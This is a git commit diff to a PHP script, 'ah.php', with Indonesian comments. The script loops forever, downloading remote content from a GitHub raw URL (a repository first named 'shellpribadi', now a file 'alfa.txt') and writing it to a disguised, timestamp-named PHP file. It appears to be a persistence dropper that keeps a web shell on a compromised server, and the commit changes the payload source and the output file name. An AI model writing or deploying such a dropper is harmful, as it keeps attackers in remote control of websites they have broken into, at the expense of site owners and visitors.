3ae52c4dede2beac6bf8817364a80fdf24693bb3
kennn404 <kennn4013@gmail.com>
2024-12-21 23:30:20 +0700

    Update ah.php

--- ah.php
+++ ah.php
@@ -3,12 +3,12 @@
 // Loop tak terbatas
 while (true) {
     // Mengambil konten dari URL dan menyimpannya ke file 'tes.php'
-    $url = 'https://raw.githubusercontent.com/kennn404/shellpribadi/refs/heads/main/in.txt';
+    $url = 'https://raw.githubusercontent.com/kennn404/test/refs/heads/main/alfa.txt';
     $content = file_get_contents($url);
 
     // Memastikan konten berhasil diambil sebelum menulis ke file
     if ($content !== false) {
-        file_put_contents('20220727061038_KGB.php', $content);
+        file_put_contents('20220727061038_KGAA.php', $content);
     } else {
         echo "Gagal mengunduh konten dari $url\n";
     }
